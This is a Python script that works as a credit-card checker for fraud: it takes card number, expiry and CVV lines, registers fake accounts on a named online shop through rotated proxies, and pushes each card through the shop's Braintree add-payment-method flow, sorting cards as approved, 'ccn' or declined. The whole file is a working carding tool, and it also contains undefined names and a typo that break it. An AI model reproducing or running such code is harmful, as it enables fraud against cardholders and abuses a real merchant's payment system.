import asyncio
import aiohttp
from bs4 import BeautifulSoup
import re
import base64
import user_agent
import random
import string
import time

# Load proxies if available
try:
    with open('proxies.txt', 'r') as f:
        PROXY_LIST = [line.strip() for line in f.readlines() if line.strip()]
except FileNotFoundError:
    PROXY_LIST = []

# Global user agent
user = user_agent.generate_user_agent()

# Helper functions for generating fake user data
def generate_full_name():
    first = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah"]
    last = ["Khalil", "Abdullah", "Smith", "Johnson", "Williams"]
    return random.choice(first), random.choice(last)

def generate_address():
    cities = ["London", "Manchester"]
    streets = ["Baker St", "Oxford St"]
    zips = ["SW1A 1AA", "M1 1AE"]
    city = random.choice(cities)
    return city, "England", f"{random.randint(1, 999)} {random.choice(streets)}", random.choice(zips)

def generate_email():
    return ''.join(random.choices(string.ascii_lowercase, k=10)) + "@gmail.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=15))

def generate_phone():
    return "303" + ''.join(random.choices(string.digits, k=7))

def generate_code(length=36):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

async def get_bin_details(bin_number):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
                if response.status == 200:
                    data = await response.json()
                    bank = data.get('bank', 'Unknown')
                    card_type = data.get('brand', 'Unknown').capitalize()
                    card_level = data.get('level', 'Unknown')
                    card_type_category = data.get('type', 'Unknown')
                    country_name = data.get('country_name', '')
                    country_flag = data.get('country_flag', '')
                    return bank, card_type, card_level, card_type_category, country_name, country_flag
                else:
                    return "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", ""
    except aiohttp.ClientError as e:
        logger.error(f"Error fetching BIN details: {e}")
        return "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", ""

async def test_proxy(proxy_url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                "https://www.google.com",
                proxy=proxy_url,
                timeout=5,
                headers={'user-agent': user},
            ) as response:
                return response.status == 200
    except (aiohttp.ClientError, asyncio.TimeoutError):
        return False

async def check_cc(cc_details):
    cc, mes, ano, cvv = cc_details.split('|')
    if len(mes) == 1: mes = f'0{mes}'
    if not ano.startswith('20'): ano = f'20{ano}'
    full = f"{cc}|{mes}|{ano}|{cvv}"

    bin_number = cc[:6]
    issuer, card_type, card_level, card_type_category, country_name, country_flag = await get_bin_details(bin_number)

    start_time = time.time()
    first_name, last_name = generate_full_name()
    city, state, street_address, zip_code = generate_address()
    acc = generate_email()
    username = generate_username()
    num = generate_phone()

    headers = {'user-agent': user}
    proxy_status = "None"
    proxy_url = None
    if PROXY and PROXY_LIST:
        proxy_url = random.choice(PROXY_LIST)
        is_proxy_alive = await test_proxy(proxy_url)
        proxy_status = "Live✅" if is_proxy_alive else "Dead❌"
    proxies = {'http': proxy_url, 'https': proxy_url} if proxy_url and is_proxy_alive else None

    try:
        async with aiohttp.ClientSession() as session:
            async with session.get('https://www.bebebrands.com/my-account/', headers=headers, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                text = await r.text()
                reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', text).group(1)

            data = {
                'username': username, 'email': acc, 'password': 'SandeshData@123',
                'woocommerce-register-nonce': reg, '_wp_http_referer': '/my-account/', 'register': 'Register'
            }
            async with session.post('https://www.bebebrands.com/my-account/', headers=headers, data=data, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                pass

            async with session.get('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                text = await r.text()
                address_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', text).group(1)

            data = {
                'billing_first_name': first_name, 'billing_last_name': last_name, 'billing_country': 'GB',
                'billing_address_1': street_address, 'billing_city': city, 'billing_postcode': zip_code,
                'billing_phone': num, 'email': acc, 'save_address': 'Save address',
                'woocommerce-edit-address-nonce': address_nonce,
                '_wp_http_referer': '/my-account/edit-address/billing/', 'action': 'edit_address'
            }
            async with session.post('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, data=data, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                pass

            async with session.get('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, proxy=proxiesliks['http'] if proxies else None, ssl=False) as r:
                text = await r.text()
                add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', text).group(1)
                client_nonce = re.search(r'client_token_nonce":"([^"]+)"', text).group(1)

            data = {
                'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce
            }
            async with session.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', headers=headers, data=data, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                token_resp = await r.json()
                enc = token_resp['data']
                dec = base64.b64decode(enc).decode('utf-8')
                au = re.search(r'"authorizationFingerprint":"(.*?)"', dec).group(1)

            tokenize_headers = {
                'authorization': f'Bearer {au}', 'braintree-version': '2018-05-10', 'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com', 'referer': 'https://assets.braintreegateway.com/', 'user-agent': user
            }
            json_data = {
                'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': generate_code(36)},
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
                'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mes, 'expirationYear': ano, 'cvv': cvv}, 'options': {'validate': False}}},
                'operationName': 'TokenizeCreditCard'
            }
            async with session.post('https://payments.braintree-api.com/graphql', headers=tokenize_headers, json=json_data, proxy=proxies['http'] if proxies else None, ssl=False) as r:
                tok = (await r.json())['data']['tokenizeCreditCard']['token']

            headers.update({
                'authority': 'www.bebebrands.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://www.bebebrands.com',
                'referer': 'https://www.bebebrands.com/my-account/add-payment-method/'
            })
            data = [
                ('payment_method', 'braintree_credit_card'), ('wc-braintree-credit-card-card-type', 'master-card'),
                ('wc_braintree_credit_card_payment_nonce', tok), ('wc_braintree_device_data', '{"correlation_id":"ca769b8abef6d39b5073a87024953791"}'),
                ('wc-braintree-credit-card-tokenize-payment-method', 'true'), ('woocommerce-add-payment-method-nonce', add_nonce),
                ('_wp_http_referer', '/my-account/add-payment-method/'), ('woocommerce_add_payment_method', '1')
            ]
            async with session.post('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, data=data, proxy=proxies['http'] if proxies else None, ssl=False) as response:
                text = await response.text()
                soup = BeautifulSoup(text, 'html.parser')
                error_message = soup.select_one('.woocommerce-error .message-container')
                msg = error_message.text.strip() if error_message else "Unknown error"

        time_taken = time.time() - start_time
        result = {
            'card': full,
            'message': msg,
            'time_taken': time_taken,
            'proxy_status': proxy_status,
            'issuer': issuer,
            'card_type': card_type,
            'card_level': card_level,
            'card_type_category': card_type_category,
            'country_name': country_name,
            'country_flag': country_flag
        }

        if any(x in text for x in ['Nice! New payment method added', 'Insufficient funds', 'Payment method successfully added.', 'Duplicate card exists in the vault.']):
            result['status'] = 'approved'
        elif 'Card Issuer Declined CVV' in text:
            result['status'] = 'ccn'
        else:
            result['status'] = 'declined'

        return result
    except aiohttp.ClientSSLError as ssl_err:
        return {
            'card': full,
            'status': 'error',
            'message': f"SSL Error: {str(ssl_err)}",
            'time_taken': time.time() - start_time,
            'proxy_status': proxy_status,
            'issuer': issuer,
            'card_type': card_type,
            'card_level': card_level,
            'card_type_category': card_type_category,
            'country_name': 'Unknown',
            'country_flag': ''
        }
    except aiohttp.ClientError as e:
        return {
            'card': full,
            'status': 'error',
            'message': str(e),
            'time_taken': time.time() - start_time,
            'proxy_status': proxy_status,
            'issuer': issuer,
            'card_type': card_type,
            'card_level': card_level,
            'card_type_category': card_type_category,
            'country_name': 'Unknown',
            'country_flag': ''
        }
